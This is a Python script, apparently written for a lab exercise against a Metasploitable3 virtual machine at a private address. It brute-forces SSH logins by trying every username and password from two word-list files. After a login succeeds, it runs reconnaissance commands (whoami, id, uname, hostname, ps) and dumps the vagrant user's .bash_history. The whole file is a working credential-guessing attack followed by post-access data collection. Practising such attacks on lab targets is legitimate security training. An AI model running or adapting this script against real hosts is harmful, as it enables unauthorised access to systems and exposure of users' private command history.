import paramiko
import time

hostname = "192.168.56.102"
port = 22

# Read usernames and passwords from files
with open("users.txt", "r") as f:
    users = f.read().splitlines()

with open("passwords.txt", "r") as f:
    passwords = f.read().splitlines()

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

found = False

for username in users:
    for password in passwords:
        print(f'Trying {username}:{password}')
        try:
            client.connect(hostname, port=port, username=username, password=password, timeout=5)
            print('\n[+] Login success!')
            print(f'[+] Cracked credentials: {username}:{password}')
            found = True
            break
        except:
            print('[-] Failed\n')
            time.sleep(1)
    if found:
        break

if found:
    print('\n[+] printing whoami:')
    stdin, stdout, stderr = client.exec_command("whoami")
    print(stdout.read().decode().strip())

    print('\n[+] printing id:')
    stdin, stdout, stderr = client.exec_command("id")
    print(stdout.read().decode().strip())

    print('\n[+] printing uname -a:')
    stdin, stdout, stderr = client.exec_command("uname -a")
    print(stdout.read().decode().strip())

    print('\n[+] printing hostname:')
    stdin, stdout, stderr = client.exec_command("hostname")
    print(stdout.read().decode().strip())

    print('\n[+] printing .bash_history:')
    stdin, stdout, stderr = client.exec_command("cat /home/vagrant/.bash_history")
    print(stdout.read().decode().strip())

    print('\n[+] printing first 3 processes:')
    stdin, stdout, stderr = client.exec_command("ps aux | head -3")
    print(stdout.read().decode().strip())

    print('\n[✔] Exploit done. Metasploitable3 was accessed by brute-force!\n')
else:
    print('[x] Brute-force failed. No valid credentials found.')

client.close()
